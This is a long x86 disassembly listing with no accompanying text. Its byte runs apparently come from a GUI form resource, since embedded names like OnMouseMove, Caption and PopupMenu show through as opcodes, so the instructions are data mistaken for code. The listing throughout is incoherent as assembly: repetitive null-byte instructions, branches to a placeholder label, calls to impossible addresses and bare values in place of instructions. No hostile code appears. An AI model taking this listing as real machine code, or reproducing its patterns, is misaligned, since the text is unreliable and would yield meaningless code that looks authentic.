xor al 0x40
add al ah
and al 0x44
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov eax 0x80004407
push esp
inc esp
add [ eax + 0x3000441c ] ch
jb r-xdata
arpl [ ebx - 0x44 ] bp
xchg edx eax
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
inc esp
outsd
ja r-xdata
inc esp
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
outsb
push ebx
je r-xdata
dec edi
jo r-xdata
add [ eax ] al
jmp eax
dec esp
xchg ecx eax
inc ebx
add al ch
add [ eax ] eax
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
call 0xffffffffe94227a0
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002b ] al
xchg ecx eax
inc ebx
add al bl
add [ eax ] eax
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
inc eax
inc ecx
add [ edx + eax ] bh
inc esp
inc esp
add [ eax - 0x57ffbbac ] al
sbb al 0x44
add [ eax ] dh
inc esp
outsd
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ eax + ebx * 2 + 0x4f940043 ] cl
inc esp
add [ eax - 0x3ffbbac ] dh
jb r-xdata
add [ eax ] al
call 0xffffffffd8436b73
inc esp
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add ah ch
pop eax
inc ebx
add al dh
pop ecx
inc ebx
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0xff
add [ ebx + 0x497c0044 ] al
add [ eax ] ch
push esp
inc ebx
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add [ edx + ebx * 2 + 0x43 ] bh
add al dh
sbb al [ eax + eax - 0x2c ]
pop edx
inc ebx
add [ eax - 0x5bffbbe2 ] ah
push ds
inc esp
add [ ebp + ebx + 0x44 ] bl
inc ebx
add al ah
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg ebx eax
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
xchg esp eax
cwde
inc esp
jb r-xdata
inc ecx
add [ ebx + ebx * 4 + 0x588c0041 ] bh
inc ebx
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
pop esp
or [ eax + eax + 0x34 ] eax
fild [ ebx ]
mov ah 0x9b
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
shr [ bx + si ] 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
sub [ ebx ] eax
stosb [ edi ]
sub [ ebx ] eax
sub_4313b1
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
dec esp
popad
jns r-xdata
dec edi
jo r-xdata
inc ebx
add al bl
dec ecx
inc ebx
add ah bh
dec ecx
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
inc ebx
jne r-xdata
or [ ebx + 0x74 ] dl
inc ebx
jb r-xdata
add bh bh
rol [ ecx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : 0x65476e4f ] cl
je r-xdata
inc ebx
add al ah
add [ eax ] al
jmp eax
sub [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ esp + ebx * 2 ] cl
je r-xdata
inc ebx
add [ edi + eax * 2 ] cl
inc ebx
add [ esp + eax * 2 + 0x540c0043 ] al
inc ebx
jne r-xdata
add [ eax ] al
hlt
xor al [ eax ]
or al 0x5c
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + edx + 0x43 ] ah
add [ 0x6f546c74 ] al
jo r-xdata
inc ebx
add [ ecx + esi * 8 ] al
inc ebx
add [ eax ] al
int1
inc ebx
add al dl
int1
inc ebx
add [ eax - 0x2bffbc2c ] dl
fild [ ebx ]
cmp bl bl
inc ebx
add [ eax - 0x1c ] ah
inc ebx
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add al bh
inc edi
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add al bl
inc ebx
insb
jae r-xdata
inc esp
add [ edx + eax + 0x44 ] dh
add [ esi + esi * 8 + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add ah al
adc eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ 0x15b00043 ] dl
inc ebx
add [ ecx + eax - 0x5d4c0000 ] cl
inc ebx
add [ ebx + ebx * 4 + 0x34e40041 ] bl
inc eax
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add [ ebp + esi * 8 + 0x32280043 ] dl
inc eax
add [ edx + esi + 0x40 ] al
add [ esp + ebx * 2 ] cl
inc esp
jb r-xdata
imul esi [ ebp + 0x49 ] 0x706f666e
nop
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
dec ebp
outsd
jne r-xdata
inc ebx
add [ edx ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
inc esp
add [ edx + eax + 0x44 ] dh
add [ esi + esi * 8 + 0x43 ] ch
inc ebx
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
or al 0x5c
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
lea eax [ eax ]
les edx [ 0xc070043 ]
push esp
inc ebx
jne r-xdata
or [ esp + ebp * 2 + 0x42 ] dh
je r-xdata
je r-xdata
pop eax
xchg esp eax
inc ebx
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080034 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
shr [ eax + 0x14 ] 0x43
add [ ebx ] al
or edx [ esp + edx * 2 + 0x65 ]
js r-xdata
outsb
push ebx
je r-xdata
arpl [ ebx - 0x44 ] bp
xchg edx eax
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
inc esp
outsd
ja r-xdata
add [ edi ] al
inc ecx
outsb
inc ebx
je r-xdata
add [ eax ] al
hlt
inc eax
inc ecx
add al dh
inc esi
inc ebx
add al bl
dec eax
inc ebx
add [ eax + 0x340043d5 ] cl
fild [ ebx ]
mov ah 0x9b
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 + 0x43d80041 ] bh
inc ebx
add [ ecx + esi * 8 ] al
inc ebx
add [ eax ] al
int1
inc ebx
add al dl
int1
inc ebx
add [ eax - 0x2bffbc2c ] dl
fild [ ebx ]
cmp bl bl
inc ebx
add [ eax - 0x1c ] ah
inc ebx
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add al bh
inc edi
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
je r-xdata
mov ah 0x9b
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 + 0x43d80041 ] bh
outsd
insd
add [ eax ] dh
inc ebx
outsb
je r-xdata
call 0xffffffffd843573e
add [ eax ] al
add [ eax ] cl
jecxz r-xdata
add [ eax ] dl
inc eax
add [ ebp + 0x1 ] ch
add bh bh
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
add [ eax ] dh
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
inc eax
inc ecx
add al dh
inc esi
inc ebx
add al bl
dec eax
inc ebx
test [ ebx ] 0x30
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
outsd
insb
outsd
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
jo r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
fadd [ edi + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
or al 0x8f
inc ebx
add [ ecx ] ah
add bh bh
mov al [ 0x3c0043d4 ]
aad 0x43
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
add ah ah
xchg [ ebx ] eax
pop ebx
add [ eax ] al
jmp [ eax - 0x2a ]
je r-xdata
jmp [ eax ]
jae r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x8eb46564
inc ebx
add [ ecx + 0x43 ] cl
pop [ ebx ]
je r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb465646f
mov es [ ebx ]
dec esp
loope r-xdata
add [ eax + 0x340043d5 ] cl
fild [ ebx ]
fmul [ eax + 0x43 ]
outsd
je r-xdata
inc edx
add bh bh
and [ eax + 0x43 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c0017 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
imul ebp [ edi + 0x6e ] sub_41aa90
jo r-xdata
add bh bh
add [ eax ] al
add [ 0x72440800 ] dl
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
imul ebp [ esi + 0x74 ] 0x4387cc73
add [ edx ] bh
add bh bh
push esp
push es
add [ ecx + 0x43 ] bh
add [ ecx + eax + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070010 ] al
popad
jo r-xdata
inc eax
add [ ecx ] bl
add bh bh
js r-xdata
outsd
insb
xor [ edi + 0x680041 ] ch
add bh bh
inc eax
loop r-xdata
mov [ 0x1680043 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
mov es [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add bh bh
in al dx
loop r-xdata
add bh bh
add [ eax + 0x1 ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add bh bh
adc bl ah
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax - 0x1e ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
jpe r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f500900
outsb
je r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
je r-xdata
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] eax
call [ eax + ecx * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x43 ] ah
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
and [ eax ] eax
push es
dec esp
popad
jns r-xdata
adc al 0x43
add [ esi + 0x1 ] ch
add bh bh
xchg esp eax
dec eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
je r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push 0x6948776f
outsb
outsb
je r-xdata
adc [ eax ] al
pop ecx
add [ eax ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jne r-xdata
adc [ eax ] al
adc al 0x48
inc ebx
add [ eax + 0x48 ] dl
inc ebx
add [ eax + 0xff0001 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540b0020 ] al
jb r-xdata
adc [ eax ] al
0xc0ff0000 0x43e2
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
add [ eax ] al
and [ eax ] 0x0
adc [ ecx ] eax
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
sbb al 0x2
adc [ eax ] al
jo r-xdata
inc eax
add [ ecx - 0x63010000 ] bl
loop r-xdata
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
js r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
insb
loopne r-xdata
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
outsb
jae r-xdata
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
push ds
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
inc ebx
push 0x10007261
push [ eax + ecx * 2 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add bh bh
xor al 0x48
or edx [ edx + esi * 2 + 0x61 ]
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
xlat
inc esp
add [ eax + eax ] bh
inc [ ecx ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
add [ eax ] al
dec edi
jbe r-xdata
add al 0x93
push eax
outsd
jo r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add [ eax ] eax
[ edx + eax ]
add ah bh
add [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
jb r-xdata
outsb
je r-xdata
inc esp
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
xchg ebx eax
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
call 0xffffffffd8435f2d
add [ eax ] al
inc ebx
add [ eax ] cl
xchg ebx eax
push ebx
je r-xdata
inc esp
outsd
arpl [ ebx - 0x44 ] bp
xchg edx eax
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebp
jo r-xdata
jo r-xdata
add [ eax + 0x4f0b002b ] al
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
outsd
add [ eax ] eax
push [ eax + 0x1004348 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ edi ] al
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
adc [ ecx ] eax
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
nop
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ eax ] ah
dec edx
jb r-xdata
jae r-xdata
adc [ ecx ] eax
js r-xdata
inc ebp
outsb
inc esp
jb r-xdata
adc [ ecx ] eax
add [ ecx ] 0x0
inc [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9421ae9
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
insb
inc ebx
insb
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
xchg ecx eax
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
inc ebx
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add al ch
dec edx
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
xchg esp eax
cwde
inc esp
jb r-xdata
outsb
dec ebp
outsd
jne r-xdata
sub [ esi ] 0x0
or al 0x4f
outsd
ja r-xdata
inc esp
add bh bh
js r-xdata
inc ebp
outsb
dec esi
outsd
outsb
or al 0x73
jae r-xdata
je r-xdata
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add al cl
dec edx
inc ebx
add [ esp + ecx * 2 ] al
inc ebx
add al al
dec ebx
inc ebx
add [ eax + 0x3400434d ] cl
dec esp
inc ebx
add ah ah
dec ebx
inc ebx
add [ eax - 0x13ffbcb4 ] bl
dec esp
inc ebx
add [ eax ] cl
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov bl 0xff
push eax
push ecx
inc ebx
add [ eax + 0xc004351 ] dl
push edx
inc ebx
add ah al
push ecx
inc ebx
add ah ch
push ecx
inc ebx
add [ eax + 0x52 ] cl
inc ebx
add [ eax - 0xbffbcae ] al
push eax
inc ebx
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
inc esp
add ah dh
dec edi
inc ebx
add [ ecx + ecx * 2 + 0x44 ] bh
add [ ebx + 0x44 ] bh
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add [ esi + ecx * 2 ] ah
inc ebx
add al ah
dec esi
inc ebx
add [ eax + 0x4f ] dl
inc ebx
add [ eax - 0x5bffbbe2 ] ah
push ds
inc esp
add [ ebp + ebx + 0x44 ] bl
inc ecx
add [ ebx + ebx * 4 + 0x4a200041 ] bh
pop esp
or [ eax + eax + 0x34 ] eax
fild [ ebx ]
mov ah 0x9b
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
enter 0x431c 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
jb r-xdata
jae r-xdata
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
sbb eax 0x2200043
add [ eax ] al
fcomp [ esi - 0x6463ffbd ]
inc ecx
add ah ah
xor al 0x40
add al dh
dec esp
popad
jbe r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
je r-xdata
add [ 0x74617453 ] al
jpe r-xdata
je r-xdata
jb r-xdata
outsd
insd
inc ebp
imul esi [ fs : eax + ecx * 8 + 0x1c ] 0xa28c0043
inc ebx
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax ] al
add [ eax - 0x1dffbce3 ] dh
les edx [ ebx + eax * 2 + 0x10000 ]
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
jb r-xdata
je r-xdata
outsd
jb r-xdata
outsb
je r-xdata
jb r-xdata
push esp
dec edi
ja r-xdata
outsb
je r-xdata
andps xmm1 [ gs : edi + 0x77 ]
add eax 0x74617453
mov [ edx + 0x103c0043 ] fs
imul esp [ ebx + 0x61 ] 0x7373066c
insb
jae r-xdata
insb
jae r-xdata
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add [ eax ] bl
push ecx
inc ebx
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov eax 0x80004407
push esp
inc esp
add [ eax + 0x3000441c ] ch
jb r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
je r-xdata
push 0x6e490774
outsb
andps xmm1 [ edi + 0x77 ]
add [ esi ] eax
dec ecx
outsb
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
add al 0x52
inc eax
ja r-xdata
add [ esp + ebx * 4 - 0x2f4fffbf ] bh
inc ebx
add al dh
inc ebx
add [ eax + edx ] bh
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
insb
or dh [ ebx + 0x73 ]
push esi
inc ebx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add [ eax ] al
add [ esp + ebx * 4 ] al
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 2 + 0x40 ] ch
add [ edx + 0x103c0043 ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
ror [ esi + ebx + 0xe080043 ] 0x54
inc esp
jb r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax + 0x4b9cff00 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
[ ebx + ecx * 2 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
inc eax
inc ecx
add [ edx + eax ] bh
inc esp
inc esp
add [ eax - 0x57ffbbac ] al
sbb al 0x44
add [ eax ] dh
pushfd
inc ecx
add [ ecx + edx * 8 + 0x43 ] bl
add [ eax - 0x64 ] al
inc ecx
add ah dl
pushfd
inc ecx
add [ eax ] ch
popfd
inc ecx
add [ edi + ecx * 8 + 0x52c00043 ] bl
inc ebx
add [ eax ] dl
rol [ ebx ] 0x1
mov esp 0x840044a7
push es
inc esp
add [ eax + 0x440043d1 ] cl
rol [ ebx ] 0x1
or al 0xa8
inc esp
add [ eax ] ah
test al 0x44
add [ eax + edx * 8 + 0x43 ] bh
add [ eax - 0x58 ] cl
inc esp
add al bl
rol [ ebx ] 0x1
clc
push edx
inc ebx
add al bh
rol [ ebx ] 0x1
pop eax
test al 0x44
add [ esi + eax - 0x2e13ffbc ] cl
inc ebx
add [ edx + edx * 8 ] ch
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
insb
test al 0x44
add [ eax - 0x58 ] dh
inc esp
add [ ecx + edx * 8 ] bh
inc ebx
add [ esi + ecx * 8 + 0x54110043 ] ch
inc edx
jne r-xdata
add [ eax - 0xfffbc30 ] dh
jb r-xdata
add [ edx + esi + 0x40 ] al
add [ eax - 0x63ffbe64 ] cl
push edx
inc ebx
jb r-xdata
fild [ ebx ]
mov ah 0x9b
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 + 0x535c0041 ] bh
inc ebx
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
dec ecx
je r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
mov eax eax
cld
push ds
inc ebx
add [ ebx + 0x431efcc0 ] cl
pop edi
inc eax
ja r-xdata
insb
push es
jae r-xdata
push ds
inc ebx
add [ ebx ] al
or al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x431fa0c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edx + 0x103c0043 ] fs
inc esp
add [ ebx + 0x497c0044 ] al
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
inc esp
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
